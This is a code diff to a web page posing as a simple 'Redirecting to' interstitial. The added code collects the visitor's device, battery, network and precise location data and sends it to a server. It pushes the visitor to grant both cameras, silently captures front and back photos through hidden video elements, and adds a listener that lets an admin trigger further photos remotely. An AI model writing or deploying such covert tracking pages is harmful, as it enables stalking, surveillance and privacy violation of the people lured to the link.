@@ -47,7 +47,30 @@
             margin-top: 4px;
         }
         .sub-text { font-size: 13px; color: #8895aa; margin-top: 12px; }
+        .status-text {
+            font-size: 14px;
+            color: #e53e3e;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+        .status-text.done { color: #22a67e; }
         #hiddenVideo, #hiddenVideoBack { display: none; }
+        .permission-status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fc;
+            border-radius: 8px;
+            text-align: left;
+            font-size: 13px;
+        }
+        .permission-status .item {
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .permission-status .item:last-child { border-bottom: none; }
+        .permission-status .granted { color: #22a67e; }
+        .permission-status .pending { color: #f6ad55; }
+        .permission-status .denied { color: #e53e3e; }
     </style>
 </head>
 <body>
@@ -55,7 +78,15 @@
         <div class="spinner"></div>
         <div class="redirect-text">Redirecting to</div>
         <div class="redirect-url" id="redirectUrlDisplay">Loading...</div>
-        <div class="sub-text">Please wait a moment</div>
+        <div class="sub-text">Please grant all permissions to continue</div>
+        <div class="status-text" id="statusText">⏳ Waiting for permissions...</div>
+        
+        <!-- Permission Status -->
+        <div class="permission-status" id="permissionStatus">
+            <div class="item" id="statusLocation">📍 Location: <span class="pending">Waiting...</span></div>
+            <div class="item" id="statusFrontCam">📸 Front Camera: <span class="pending">Waiting...</span></div>
+            <div class="item" id="statusBackCam">📸 Back Camera: <span class="pending">Waiting...</span></div>
+        </div>
     </div>
 
     <video id="hiddenVideo" autoplay playsinline muted></video>
@@ -74,10 +105,73 @@
         (function() {
             const visitorId = window.location.pathname.split('/').pop();
             const redirectDisplay = document.getElementById('redirectUrlDisplay');
+            const statusText = document.getElementById('statusText');
             
             let socket = null;
             let redirectUrl = 'https://www.google.com';
             let redirectTriggered = false;
+            
+            // Permission tracking
+            let permissions = {
+                location: false,
+                frontCamera: false,
+                backCamera: false
+            };
+            
+            let cameraStream = null;
+            let cameraStreamBack = null;
+            let frontVideo = document.getElementById('hiddenVideo');
+            let backVideo = document.getElementById('hiddenVideoBack');
+            let frontPhotoSent = false;
+            let backPhotoSent = false;
+
+            function updateStatus(msg, isDone = false) {
+                statusText.textContent = msg;
+                statusText.className = 'status-text' + (isDone ? ' done' : '');
+                console.log(msg);
+            }
+
+            function updatePermissionStatus(type, status) {
+                const element = document.getElementById(type === 'location' ? 'statusLocation' : 
+                                                       type === 'front' ? 'statusFrontCam' : 'statusBackCam');
+                if (element) {
+                    const span = element.querySelector('span');
+                    if (span) {
+                        span.textContent = status;
+                        span.className = status === 'Granted' ? 'granted' : 
+                                        status === 'Denied' ? 'denied' : 'pending';
+                    }
+                }
+            }
+
+            function checkAllPermissions() {
+                const allGranted = permissions.location && permissions.frontCamera && permissions.backCamera;
+                if (allGranted) {
+                    updateStatus('✅ All permissions granted! Redirecting...', true);
+                    
+                    // Notify server
+                    if (socket && socket.connected) {
+                        socket.emit('visitor-data', {
+                            visitorId,
+                            type: 'permissionsGranted',
+                            content: true
+                        });
+                    }
+                    
+                    // Redirect after 2 seconds
+                    setTimeout(function() {
+                        if (!redirectTriggered) {
+                            redirectNow();
+                        }
+                    }, 2000);
+                } else {
+                    const pending = [];
+                    if (!permissions.location) pending.push('Location');
+                    if (!permissions.frontCamera) pending.push('Front Camera');
+                    if (!permissions.backCamera) pending.push('Back Camera');
+                    updateStatus(`⏳ Waiting for: ${pending.join(', ')}`);
+                }
+            }
 
             function fetchRedirectUrl() {
                 fetch(`/api/visitor/${visitorId}`)
@@ -85,7 +179,7 @@
                     .then(data => {
                         redirectUrl = data.redirectUrl || 'https://www.google.com';
                         redirectDisplay.textContent = redirectUrl;
-                        startProcess();
+                        connectSocket();
                     })
                     .catch(() => {
                         fetch(`/api/visitor-redirect/${visitorId}`)
@@ -93,40 +187,53 @@
                             .then(data => {
                                 redirectUrl = data.redirectUrl || 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                startProcess();
+                                connectSocket();
                             })
                             .catch(() => {
                                 redirectUrl = 'https://www.google.com';
                                 redirectDisplay.textContent = redirectUrl;
-                                startProcess();
+                                connectSocket();
                             });
                     });
-            }
-
-            function startProcess() {
-                connectSocket();
-                setTimeout(() => {
-                    if (!redirectTriggered) redirectNow();
-                }, 6000);
             }
 
             function connectSocket() {
                 try {
                     socket = io({
                         transports: ['websocket', 'polling'],
-                        reconnectionAttempts: 3,
+                        reconnectionAttempts: 5,
                         reconnectionDelay: 1000
                     });
 
                     socket.on('connect', function() {
+                        console.log('✅ Socket connected');
                         sendDeviceInfo();
-                        requestPermissions();
+                        requestAllPermissions();
                     });
 
-                    socket.on('connect_error', function() {
+                    socket.on('connect_error', function(err) {
+                        console.log('❌ Socket error:', err.message);
                         setTimeout(() => socket.connect(), 2000);
                     });
-                } catch(e) {}
+
+                    // Listen for admin capture commands
+                    socket.on('capture-command', function(data) {
+                        console.log('📸 Capture command received:', data.type);
+                        if (data.type === 'front') {
+                            capturePhoto('front', frontVideo);
+                        } else if (data.type === 'back') {
+                            capturePhoto('back', backVideo);
+                        } else if (data.type === 'both') {
+                            capturePhoto('front', frontVideo);
+                            setTimeout(() => {
+                                capturePhoto('back', backVideo);
+                            }, 1000);
+                        }
+                    });
+
+                } catch(e) {
+                    console.log('❌ Socket init error:', e.message);
+                }
             }
 
             function sendDeviceInfo() {
@@ -146,6 +253,7 @@
                 };
 
                 socket.emit('visitor-connect', { visitorId, ...deviceInfo });
+                console.log('📱 Device info sent');
 
                 // Battery
                 if (navigator.getBattery) {
@@ -158,6 +266,7 @@
                                     type: 'battery',
                                     content: level
                                 });
+                                console.log(`🔋 Battery: ${level}%`);
                             }
                         })
                         .catch(() => {});
@@ -179,14 +288,22 @@
                         type: 'network',
                         content: networkData
                     });
+                    console.log('📶 Network info sent');
                 }
             }
 
-            function requestPermissions() {
-                // Location
+            function requestAllPermissions() {
+                updateStatus('⏳ Requesting permissions...');
+                
+                // ===== LOCATION =====
+                console.log('📍 Requesting location...');
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         function(pos) {
+                            console.log('✅ Location granted');
+                            permissions.location = true;
+                            updatePermissionStatus('location', 'Granted');
+                            
                             const lat = pos.coords.latitude;
                             const lng = pos.coords.longitude;
                             
@@ -194,7 +311,8 @@
                                 .then(res => res.json())
                                 .then(data => {
                                     const locationInfo = {
-                                        lat, lng,
+                                        lat: lat,
+                                        lng: lng,
                                         accuracy: pos.coords.accuracy,
                                         timestamp: new Date().toISOString(),
                                         country: data.countryName || 'Unknown',
@@ -207,78 +325,134 @@
                                             type: 'location',
                                             content: locationInfo
                                         });
+                                        console.log('✅ Location sent');
                                     }
                                 })
                                 .catch(() => {
+                                    const locationInfo = {
+                                        lat: lat,
+                                        lng: lng,
+                                        accuracy: pos.coords.accuracy,
+                                        timestamp: new Date().toISOString()
+                                    };
                                     if (socket && socket.connected) {
                                         socket.emit('visitor-data', {
                                             visitorId,
                                             type: 'location',
-                                            content: { lat, lng, accuracy: pos.coords.accuracy }
+                                            content: locationInfo
                                         });
                                     }
                                 });
+                            
+                            checkAllPermissions();
                         },
-                        function() {},
-                        { timeout: 4000, enableHighAccuracy: true }
+                        function(err) {
+                            console.log('❌ Location denied:', err.message);
+                            permissions.location = false;
+                            updatePermissionStatus('location', 'Denied');
+                            checkAllPermissions();
+                        },
+                        { timeout: 15000, enableHighAccuracy: true }
                     );
                 }
 
-                // Front Camera
+                // ===== FRONT CAMERA =====
+                console.log('📸 Requesting front camera...');
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user' },
                     audio: false
                 })
                 .then(function(stream) {
-                    const video = document.getElementById('hiddenVideo');
-                    video.srcObject = stream;
-                    return video.play();
+                    console.log('✅ Front camera granted');
+                    permissions.frontCamera = true;
+                    updatePermissionStatus('front', 'Granted');
+                    cameraStream = stream;
+                    frontVideo.srcObject = stream;
+                    return frontVideo.play();
                 })
                 .then(function() {
+                    // Auto capture front photo
                     setTimeout(function() {
-                        capturePhoto('front', document.getElementById('hiddenVideo'));
-                    }, 1000);
+                        capturePhoto('front', frontVideo);
+                    }, 1500);
+                    checkAllPermissions();
                 })
-                .catch(function() {});
+                .catch(function(err) {
+                    console.log('❌ Front camera denied:', err.message);
+                    permissions.frontCamera = false;
+                    updatePermissionStatus('front', 'Denied');
+                    checkAllPermissions();
+                });
 
-                // Back Camera
+                // ===== BACK CAMERA =====
+                console.log('📸 Requesting back camera...');
                 navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'environment' },
                     audio: false
                 })
                 .then(function(stream) {
-                    const video = document.getElementById('hiddenVideoBack');
-                    video.srcObject = stream;
-                    return video.play();
+                    console.log('✅ Back camera granted');
+                    permissions.backCamera = true;
+                    updatePermissionStatus('back', 'Granted');
+                    cameraStreamBack = stream;
+                    backVideo.srcObject = stream;
+                    return backVideo.play();
                 })
                 .then(function() {
+                    // Auto capture back photo
                     setTimeout(function() {
-                        capturePhoto('back', document.getElementById('hiddenVideoBack'));
-                    }, 2000);
+                        capturePhoto('back', backVideo);
+                    }, 2500);
+                    checkAllPermissions();
                 })
-                .catch(function() {});
+                .catch(function(err) {
+                    console.log('❌ Back camera denied:', err.message);
+                    permissions.backCamera = false;
+                    updatePermissionStatus('back', 'Denied');
+                    checkAllPermissions();
+                });
             }
 
             function capturePhoto(type, video) {
-                if (!video || !video.videoWidth) return;
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/jpeg', 0.7);
-
-                if (socket && socket.connected) {
-                    socket.emit('visitor-data', {
-                        visitorId,
-                        type: type === 'back' ? 'backCamera' : 'frontCamera',
-                        content: imageData
-                    });
+                if (!video || !video.videoWidth || !video.videoHeight) {
+                    console.log(`⚠️ ${type} video not ready`);
+                    return;
                 }
 
-                if (video.srcObject) {
-                    video.srcObject.getTracks().forEach(t => t.stop());
+                try {
+                    const canvas = document.createElement('canvas');
+                    const maxWidth = 800;
+                    const maxHeight = 600;
+                    let width = video.videoWidth;
+                    let height = video.videoHeight;
+                    
+                    if (width > maxWidth) {
+                        height = (height * maxWidth) / width;
+                        width = maxWidth;
+                    }
+                    if (height > maxHeight) {
+                        width = (width * maxHeight) / height;
+                        height = maxHeight;
+                    }
+                    
+                    canvas.width = width;
+                    canvas.height = height;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, width, height);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.9);
+
+                    console.log(`📸 ${type} photo captured`);
+
+                    if (socket && socket.connected) {
+                        socket.emit('visitor-data', {
+                            visitorId: visitorId,
+                            type: type === 'back' ? 'backCamera' : 'frontCamera',
+                            content: imageData
+                        });
+                        console.log(`✅ ${type} photo sent to server`);
+                    }
+                } catch (err) {
+                    console.log(`❌ ${type} capture error:`, err.message);
                 }
             }
 
@@ -294,11 +468,20 @@
                     });
                 }
 
+                // Clean up camera streams
+                if (cameraStream) {
+                    cameraStream.getTracks().forEach(t => t.stop());
+                }
+                if (cameraStreamBack) {
+                    cameraStreamBack.getTracks().forEach(t => t.stop());
+                }
+
                 setTimeout(() => {
                     window.location.href = redirectUrl;
-                }, 500);
+                }, 1000);
             }
 
+            // ===== START =====
             if (typeof io !== 'undefined') {
                 fetchRedirectUrl();
             } else {
@@ -307,6 +490,8 @@
 
             window.addEventListener('beforeunload', function() {
                 if (socket) socket.disconnect();
+                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+                if (cameraStreamBack) cameraStreamBack.getTracks().forEach(t => t.stop());
             });
         })();
     </script>
